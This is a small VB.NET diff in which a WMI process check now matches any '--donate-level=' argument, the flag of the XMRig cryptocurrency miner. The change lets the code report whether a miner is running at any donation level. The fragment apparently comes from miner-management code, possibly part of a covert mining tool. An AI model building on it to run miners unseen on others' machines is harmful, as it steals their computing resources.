@@ -172,7 +172,7 @@
                         Dim searcher As Management.ManagementObjectSearcher = New Management.ManagementObjectSearcher(wmiQuery)
                         Dim retObjectCollection As Management.ManagementObjectCollection = searcher.Get
                         For Each retObject As Management.ManagementObject In retObjectCollection
-                            If retObject("CommandLine").ToString.Contains("--donate-level=1") Then
+                            If retObject("CommandLine").ToString.Contains("--donate-level=") Then
                                 Return "Running"
                             End If
                         Next
